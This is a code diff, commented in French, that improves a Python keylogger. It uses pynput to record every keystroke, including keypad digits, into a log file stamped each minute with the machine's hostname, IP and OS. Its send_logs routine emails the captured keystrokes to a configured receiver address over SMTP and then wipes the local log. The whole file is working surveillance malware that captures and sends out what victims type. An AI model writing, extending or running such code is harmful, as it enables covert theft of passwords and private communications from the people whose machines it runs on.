@@ -4,6 +4,7 @@ import time
 import smtplib
 import os
 import socket
+from datetime import datetime
 from pynput.keyboard import Key, Listener
 
 # Charger le fichier conf.ini
@@ -25,12 +26,15 @@ HOSTNAME = socket.gethostname()
 IP_ADDRESS = socket.gethostbyname(HOSTNAME)
 OS_INFO = os.name  # 'nt' pour Windows, 'posix' pour Linux/macOS
 
-# Vérifier si le fichier log existe, sinon le créer
+# Vérifier si le fichier log existe, sinon le créer avec en-tête
 if not os.path.exists(LOG_FILE):
-    open(LOG_FILE, "w").close()
+    with open(LOG_FILE, "w", encoding="utf-8") as log_file:
+        log_file.write(f"Machine: {HOSTNAME}\nIP: {IP_ADDRESS}\nOS: {OS_INFO}\n----------------------\n")
+
+last_logged_minute = None
 
 def format_key(key):
-    """ Convertit les touches spéciales en caractères lisibles. """
+    """ Convertit les touches spéciales et les chiffres en caractères lisibles. """
     if isinstance(key, Key):
         special_keys = {
             Key.space: " ",
@@ -45,16 +49,31 @@ def format_key(key):
         }
         return special_keys.get(key, f"[{key.name.upper()}]")
     
-    elif hasattr(key, 'char'):  # Caractères normaux
+    elif hasattr(key, 'char') and key.char is not None:  # Caractères normaux, incluant les chiffres
         return key.char
-
+    
+    elif hasattr(key, 'vk') and 96 <= key.vk <= 105:  # Vérifier si c'est un chiffre (Pavé numérique 0-9)
+        return str(key.vk - 96)
+    
+    elif hasattr(key, 'vk') and 48 <= key.vk <= 57:  # Vérifier si c'est un chiffre (Touches normales 0-9)
+        return str(key.vk - 48)
+    
     return str(key)
 
 def on_press(key):
     """ Capture les frappes et les enregistre dans le fichier log avec un format lisible. """
+    global last_logged_minute
     try:
+        current_time = datetime.now()
+        current_minute = current_time.strftime("%H:%M")
         key_str = format_key(key)
+        
         with open(LOG_FILE, "a", encoding="utf-8") as log_file:
+            # Ajouter un timestamp si la minute a changé
+            if last_logged_minute != current_minute:
+                log_file.write(f"\n[{current_minute}] ")
+                last_logged_minute = current_minute
+            
             log_file.write(key_str)
     except Exception as e:
         print(f"Erreur d'écriture du log: {e}")
@@ -82,8 +101,9 @@ def send_logs():
             server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, f"Subject: {email_subject}\n\n{email_body}")
             server.quit()
 
-            # Nettoyer les logs après envoi
-            open(LOG_FILE, "w").close()
+            # Nettoyer les logs après envoi et réécrire l'en-tête
+            with open(LOG_FILE, "w", encoding="utf-8") as log_file:
+                log_file.write(f"Machine: {HOSTNAME}\nIP: {IP_ADDRESS}\nOS: {OS_INFO}\n----------------------\n")
         except Exception as e:
             print(f"Erreur d'envoi des logs: {e}")
 
